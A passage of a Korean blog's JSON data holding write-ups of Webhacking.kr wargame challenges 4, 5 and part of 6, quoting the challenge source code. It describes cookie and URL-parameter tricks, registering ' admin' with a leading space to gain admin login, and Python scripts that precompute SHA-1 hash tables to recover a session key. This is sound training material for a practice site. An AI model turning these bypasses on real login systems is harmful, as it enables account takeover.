colspan=2>&lt;input type=submit>&lt;/td>&lt;/tr>&lt;/form>&lt;/table>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span>\r\n</code></pre></div>\n<p>이 코드를 보고 bye나 access_denied가 아닌 pass를 띄우기 위해 맞춰주어야 할 조건들이 위에 명시되어 있다.</p>\n<p>첫번째 조건:</p>\n<div class=\"gatsby-highlight\" data-language=\"js\"><pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">eval</span><span class=\"token punctuation\">(</span>lIIIIIIIIIIIIIIIIIIl<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span>lIllIllIllIllIllIllIllIllIllIl<span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p>두번째 조건:</p>\n<div class=\"gatsby-highlight\" data-language=\"js\"><pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">eval</span><span class=\"token punctuation\">(</span>llll<span class=\"token operator\">+</span>lllllllllllllll<span class=\"token operator\">+</span>lll<span class=\"token operator\">+</span>lllllllllllllllllllll<span class=\"token operator\">+</span>lllllllllllll<span class=\"token operator\">+</span>lllll<span class=\"token operator\">+</span>llllllllllllll<span class=\"token operator\">+</span>llllllllllllllllllll<span class=\"token operator\">+</span>li<span class=\"token operator\">+</span><span class=\"token string\">'U'</span><span class=\"token operator\">+</span><span class=\"token string\">'R'</span><span class=\"token operator\">+</span><span class=\"token string\">'L'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span>lllllllllllll<span class=\"token operator\">+</span>lllllllllllllll<span class=\"token operator\">+</span>llll<span class=\"token operator\">+</span>lllll<span class=\"token operator\">+</span><span class=\"token string\">'='</span><span class=\"token operator\">+</span><span class=\"token constant\">I</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p>이 두 조건을 피해주면 된다.</p>\n<p><code class=\"language-text\">eval()</code> 함수는 문자열을 코드화 시켜주는 함수이다.\r\n웹 브라우저의 개발자 도구에서 콘솔 기능을 사용하여 위의 코드를 분석한다.</p>\n<p><img src=\"./images/8.PNG\" alt=\"var\"></p>\n<p>먼저 변수와 관련된 모든 부분을 입력해 준다.\r\n그리고 첫번째 조건 속 문자들이 무엇인지 조사했다.</p>\n<p><code class=\"language-text\">eval(lIIIIIIIIIIIIIIIIIIl)</code>의 <code class=\"language-text\">lIIIIIIIIIIIIIIIIIIl</code></p>\n<p><img src=\"./images/9.PNG\" alt=\"document.cookie\"></p>\n<p><code class=\"language-text\">indexOf(lIllIllIllIllIllIllIllIllIllIl)</code>의 <code class=\"language-text\">lIllIllIllIllIllIllIllIllIllIl</code></p>\n<p><img src=\"./images/10.PNG\" alt=\"oldzombie\"></p>\n<p>쿠키 중 oldzombie라는 이름을 가진 쿠키가 있으면 첫번째 조건을 우회할 수 있다.</p>\n<p><img src=\"./images/11.PNG\" alt=\"make_cookie_oldzombie\"></p>\n<p>첫번째 조건을 우회하여 bye가 아닌 access_denied가 뜨는 것을 볼 수 있다.</p>\n<p><img src=\"./images/12.PNG\" alt=\"access_denied\"></p>\n<p>두번째 조건 속 문자들이 무엇인지 조사했다.</p>\n<p><code class=\"language-text\">eval(llll+lllllllllllllll+lll+lllllllllllllllllllll+lllllllllllll+lllll+llllllllllllll+llllllllllllllllllll+li+'U'+'R'+'L')</code>의\r\n<code class=\"language-text\">llll+lllllllllllllll+lll+lllllllllllllllllllll+lllllllllllll+lllll+llllllllllllll+llllllllllllllllllll+li+'U'+'R'+'L'</code></p>\n<p><img src=\"./images/13.PNG\" alt=\"document.URL\"></p>\n<p><code class=\"language-text\">indexOf(lllllllllllll+lllllllllllllll+llll+lllll+'='+I)==-1)</code>의 <code class=\"language-text\">lllllllllllll+lllllllllllllll+llll+lllll+'='+I)==-1</code></p>\n<p><img src=\"./images/14.PNG\" alt=\"mode=1\"></p>\n<p>URL에 mode라는 변수를 넣으면 두번째 조건을 우회할 수 있다.</p>\n<p><img src=\"./images/15.PNG\" alt=\"Join\"></p>\n<p>두 조건을 모두 우회하여 Join이라는 문자열과 함께 가입 양식을 받을 수 있다.</p>\n<p><img src=\"./images/16.PNG\" alt=\"Join2\"></p>\n<p>아무 값이나 입력했다.(admin라고 입력하면 이미 존재하는 id라고 한다.)</p>\n<p><img src=\"./images/17.PNG\" alt=\"signup\"></p>\n<p><img src=\"./images/18.PNG\" alt=\"login\"></p>\n<p>로그인 페이지로 돌아가 join에서 입력했던 id와 패스워드를 입력하면 admin으로 로그인 할 수 있는 권한이 주어진다.</p>\n<p>join 페이지로 돌아가 admin 앞에 공백을 추가하고 가입을 시도해 보았다.</p>\n<p><img src=\"./images/19.PNG\" alt=\"join  admin\"></p>\n<p><img src=\"./images/20.PNG\" alt=\"success\"></p>\n<p>공백+admin으로 sign up하는데 성공했다.</p>\n<p><img src=\"./images/21.PNG\" alt=\"login s01va\"></p>\n<p>s01va로 로그인한 후 공백+admin으로 로그인을 시도했다.</p>\n<p><img src=\"./images/22.PNG\" alt=\"login success\"></p>\n<p><img src=\"./images/23.PNG\" alt=\"pwned\"></p>","categories":["writeup","wargame","webhacking"],"date":"February 11, 2020","description":"리뉴얼 기념 정주행","id":"a9df66d7-6aeb-518a-a76b-9331dab50900","keywords":["webhacking.kr"],"slug":"/WriteUp-Webhackingkr-05/","title":"Webhacking.kr 5번","readingTime":{"text":"4 min read"}},{"banner":{"alt":null,"caption":null,"src":null},"body":"<p><img src=\"./images/0.PNG\" alt=\"04\"></p>\n<p>4번 문제의 첫 화면이다. 저 값은 새로고침을 할 때마다 바뀐다.</p>\n<p>view-source를 누르면 아래와 같은 소스코드가 나온다.</p>\n<div class=\"gatsby-highlight\" data-language=\"xml\"><pre class=\"language-xml\"><code class=\"language-xml\"><span class=\"token prolog\">&lt;?php\r\n  include \"../../config.php\";\r\n  if($_GET['view-source'] == 1) view_source();\r\n?></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span>\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span>\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>Challenge 4<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span>\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>style</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/css<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\r\nbody { background:black; color:white; font-size:9pt; }\r\ntable { color:white; font-size:10pt; }\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>style</span><span class=\"token punctuation\">></span></span>\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span>\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span>\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">></span></span>\r\n<span class=\"token prolog\">&lt;?php\r\n  sleep(1); // anti brute force\r\n  if((isset($_SESSION['chall4'])) &amp;&amp; ($_POST['key'] == $_SESSION['chall4'])) solve(4);\r\n  $hash = rand(10000000,99999999).\"salt_for_you\";\r\n  $_SESSION['chall4'] = $hash;\r\n  for($i=0;$i&lt;500;$i++) $hash = sha1($hash);\r\n?></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span>\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">method</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>post</span><span class=\"token punctuation\">></span></span>\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>table</span> <span class=\"token attr-name\">border</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>0</span> <span class=\"token attr-name\">align</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>center</span> <span class=\"token attr-name\">cellpadding</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>10</span><span class=\"token punctuation\">></span></span>\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>tr</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>td</span> <span class=\"token attr-name\">colspan</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>3</span> <span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>background:silver;color:green;</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>b</span><span class=\"token punctuation\">></span></span><span class=\"token prolog\">&lt;?=$hash?></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>b</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>td</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>tr</span><span class=\"token punctuation\">></span></span>\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>tr</span> <span class=\"token attr-name\">align</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>center</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>td</span><span class=\"token punctuation\">></span></span>Password<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>td</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>td</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>key</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>text</span> <span class=\"token attr-name\">size</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>30</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>td</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>td</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>submit</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>td</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>tr</span><span class=\"token punctuation\">></span></span>\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>table</span><span class=\"token punctuation\">></span></span>\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">></span></span>\r\n&lt;a href=?view-source=1>[view-source]<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span>\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>center</span><span class=\"token punctuation\">></span></span>\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span>\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></code></pre></div>\n<p>아래의 조건만 충족하면 4번 문제를 풀 수 있다.</p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'chall4'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'chall4'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token function\">solve</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p>isset 함수는 해당 함수가 존재하는지를 확인하는 함수이다.\r\n'chall4'라는 세션 변수가 존재하는지를 확인하고, 'key'라는 변수가 'chall4'라는 세션 변수와 일치하면 된다.</p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">  <span class=\"token variable\">$hash</span> <span class=\"token operator\">=</span> <span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token number\">10000000</span><span class=\"token punctuation\">,</span><span class=\"token number\">99999999</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"salt_for_you\"</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'chall4'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$hash</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p>여기서 $hash는 12345678salt_for_you 와 같은 형태로 만들어진다.\r\n그리고 그 값이 그대로 chall4에 담긴다.</p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">  <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">&lt;</span><span class=\"token number\">500</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token variable\">$hash</span> <span class=\"token operator\">=</span> <span class=\"token function\">sha1</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$hash</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p>그렇게 만들어진 $hash 값을 sha1으로 500번 암호화시킨다.</p>\n<p>이 문제를 풀기 위해서 레인보우 테이블을 떠올릴 수 있다.\r\n단, 10000000salt_for_you부터 99999999salt_for_you까지의 모든 값을 500번 sha1 hash 암호화 시킨 값을 모두 받아두기에는 시간도 오래 걸리고 cpu에 부하도 많이 주게 된다.</p>\n<p>이 문제를 풀기 위한 효율적인 방법을 구상하였다.</p>\n<ol>\n<li>10000000salt_for_you 부터 20000000salt_for_you까지 sha1으로 500번 암호화시킨 사전을 미리 만들어둔다.</li>\n<li>문제 페이지에 있는 값을 미리 생성해둔 사전에서 찾는다. (찾을 확률 10%)</li>\n<li>미리 생성해둔 사전에서 key를 찾을 수 없으면 문제 페이지를 새로고침하고 2번으로 되돌아간다.</li>\n</ol>\n<p>이를 자동으로 찾기 위한 파이썬 스크립트를 작성하였다.</p>\n<p>1번 과정:</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">\r\n<span class=\"token keyword\">import</span> hashlib<span class=\"token punctuation\">,</span> csv\r\n\r\n\r\nchall4 <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span>\r\nf <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'rainbow.csv'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> newline<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span>\r\nwriter <span class=\"token operator\">=</span> csv<span class=\"token punctuation\">.</span>writer<span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">)</span>\r\n\r\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">10000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20000000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\r\n  chall4 <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"salt_for_you\"</span>\r\n  <span class=\"token builtin\">hash</span> <span class=\"token operator\">=</span> chall4\r\n\r\n  <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">500</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\r\n    <span class=\"token builtin\">hash</span> <span class=\"token operator\">=</span> hashlib<span class=\"token punctuation\">.</span>sha1<span class=\"token punctuation\">(</span><span class=\"token builtin\">hash</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\r\n    \r\n  writer<span class=\"token punctuation\">.</span>writerow<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>chall4<span class=\"token punctuation\">,</span> <span class=\"token builtin\">hash</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\r\n  <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>chall4 <span class=\"token operator\">+</span> <span class=\"token string\">\" : \"</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">hash</span><span class=\"token punctuation\">)</span>\r\n\r\nf<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\r\n</code></pre></div>\n<p>2번 과정:</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">\r\n<span class=\"token keyword\">import</span> hashlib<span class=\"token punctuation\">,</span> csv\r\n\r\n\r\nf <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'rainbow.csv'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'r'</span><span class=\"token punctuation\">,</span> newline<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span>\r\nreader <span class=\"token operator\">=</span> csv<span class=\"token punctuation\">.</span>reader<span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">)</span>\r\n<span class=\"token builtin\">hash</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span> <span class=\"token comment\"># 문제 페이지의 hash값을 여기에 입력한다.</span>\r\n\r\n<span class=\"token keyword\">for</span> line <span class=\"token keyword\">in</span> reader<span class=\"token punctuation\">:</span>\r\n  <span class=\"token keyword\">if</span> line<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">hash</span><span class=\"token punctuation\">:</span>\r\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"I found the key! : \"</span> <span class=\"token operator\">+</span> line<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\r\n\r\nf<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\r\n</code></pre></div>\n<p>위의 스크립트를 활용하다 보면 일정 확률로 문제를 풀 수 있다.</p>\n<p><img src=\"./images/1.PNG\" alt=\"script\"></p>\n<p><img src=\"./images/2.PNG\" alt=\"input key\"></p>\n<p><img src=\"./images/3.PNG\" alt=\"pwned\"></p>","categories":["writeup","wargame","webhacking"],"date":"February 08, 2020","description":"리뉴얼 기념 정주행","id":"7439e835-0eb8-5477-a53f-abbf9e0220f4","keywords":["webhacking.kr","sha1","sha1-crack"],"slug":"/WriteUp-Webhackingkr-04/","title":"Webhacking.kr 4번","readingTime":{"text":"4 min read"}},{"banner":{"alt":null,"caption":null,"src":null},"body":"<p><img src=\"./images/0.PNG\" alt=\"06\"></p>\n<p>view-source를 누르면 아래와 같은 코드를 볼 수 있다.</p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\r\n<span class=\"token keyword\">include</span> <span class=\"token string double-quoted-string\">\"../../config.php\"</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'view_source'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token function\">view_source</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n  <span class=\"token variable\">$val_id</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"guest\"</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token variable\">$val_pw</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"123qwe\"</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">&lt;</span><span class=\"token number\">20</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n    <span class=\"token variable\">$val_id</span><span class=\"token operator\">=</span><span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val_id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token variable\">$val_pw</span><span class=\"token operator\">=</span><span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val_pw</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token punctuation\">}</span>\r\n  <span class=\"token variable\">$val_id</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"!\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$val_id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token variable\">$val_id</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"2\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"@\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$val_id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token variable\">$val_id</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"3\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"$\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$val_id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token variable\">$val_id</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"4\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"^\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$val_id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token variable\">$val_id</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"5\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"&amp;\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$val_id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token variable\">$val_id</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"6\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"*\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$val_id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token variable\">$val_id</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"7\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"(\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$val_id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token variable\">$val_id</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"8\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\")\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$val_id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n  <span class=\"token variable\">$val_pw</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"!\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$val_pw</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token variable\">$val_pw</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"2\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"@\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$val_pw</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token variable\">$val_pw</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"3\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"$\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$val_pw</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token variable\">$val_pw</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"4\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"^\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$val_pw</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token variable\">$val_pw</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"5\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"&amp;\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$val_pw</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token variable\">$val_pw</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"6\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"*\"</span><span class=\"token 